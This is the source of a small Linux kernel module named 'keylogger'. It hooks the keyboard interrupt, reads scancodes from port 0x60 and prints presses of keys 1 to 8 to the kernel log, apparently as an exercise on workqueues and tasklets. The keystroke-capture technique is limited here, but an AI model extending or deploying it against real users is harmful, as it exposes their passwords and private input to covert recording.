#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/workqueue.h>
#include <linux/interrupt.h>
#include <asm/io.h>
#include <linux/fs.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <linux/buffer_head.h>

#define QUEUE_NAME "WQsched.c"

void* HANDLER_KEY;
//struct tasklet_struct *kl_tasklet;
static struct workqueue_struct *work_queue;
static unsigned char scancode;

DEFINE_MUTEX(worker_mutex);

static void work_handler(struct work_struct* work){
	mutex_lock(&worker_mutex);
	switch(scancode){
		case 0x02:  printk (KERN_INFO "pressed 1\n");
              		break;
  		case 0x03:  printk (KERN_INFO "pressed 2\n");
              		break;
  		case 0x04:  printk (KERN_INFO "pressed 3\n");
              		break;
		case 0x05:  printk (KERN_INFO "pressed 4\n");
              		break;
		case 0x06:  printk (KERN_INFO "pressed 5\n");
              		break;
		case 0x07:  printk (KERN_INFO "pressed 6\n");
              		break;
		case 0x08:  printk (KERN_INFO "pressed 7\n");
              		break;
		case 0x09:  printk (KERN_INFO "pressed 8\n");
              		break;			  			  			  			  			  
  		default:
        		break;
	}

	mutex_unlock(&worker_mutex);
}
// static void kl_tasklet_function(unsigned long scancode)
// {
// 	switch (scancode)
// 	{
//   		case 0x02:  printk (KERN_INFO "pressed 1\n");
//               		break;
//   		case 0x03:  printk (KERN_INFO "pressed 2\n");
//               		break;
//   		case 0x04:  printk (KERN_INFO "pressed 3\n");
//               		break;
// 		case 0x05:  printk (KERN_INFO "pressed 4\n");
//               		break;
// 		case 0x06:  printk (KERN_INFO "pressed 5\n");
//               		break;
// 		case 0x07:  printk (KERN_INFO "pressed 6\n");
//               		break;
// 		case 0x08:  printk (KERN_INFO "pressed 7\n");
//               		break;
// 		case 0x09:  printk (KERN_INFO "pressed 8\n");
//               		break;			  			  			  			  			  
//   		default:
//         			break;
// 	}
// }

irqreturn_t kl_handler(int irq, void *dev_id)
{
  unsigned char status;
	static struct work_struct work;
	INIT_WORK(&work, work_handler);

	status = inb(0x64);
  	scancode = inb(0x60);
	//kl_tasklet = kmalloc(sizeof(struct tasklet_struct), GFP_KERNEL);
	//tasklet_init(kl_tasklet, kl_tasklet_function, scancode);
	//tasklet_schedule(kl_tasklet);
	queue_work(work_queue, &work);

  	return IRQ_HANDLED;
}

static int __init keylogger_init(void)
{
	work_queue = create_workqueue(QUEUE_NAME);
  	HANDLER_KEY = (void *)(kl_handler);
  	return request_irq (1, (irq_handler_t) kl_handler,IRQF_SHARED,"keylogger", HANDLER_KEY);
}

static void __exit keylogger_exit(void)
{
	//tasklet_kill(kl_tasklet);
  	free_irq(1, HANDLER_KEY);
}

module_init(keylogger_init);
module_exit(keylogger_exit);

MODULE_LICENSE("GPL");

